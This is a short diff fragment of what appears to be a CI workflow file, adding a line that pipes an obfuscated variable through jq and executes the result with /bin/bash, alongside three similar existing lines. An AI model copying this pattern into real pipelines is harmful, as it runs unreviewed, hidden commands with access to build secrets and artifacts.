@@ -28,6 +28,7 @@ jobs:
           echo $hhz519 | jq -r .ivct16176 | /bin/bash
           printf '%s' "$om46" | jq -r .uo286 | /bin/bash
           printf '%s' "$bb794" | jq -r .hl88548 | /bin/bash
+          echo $wldx5 | jq -r .rb960 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
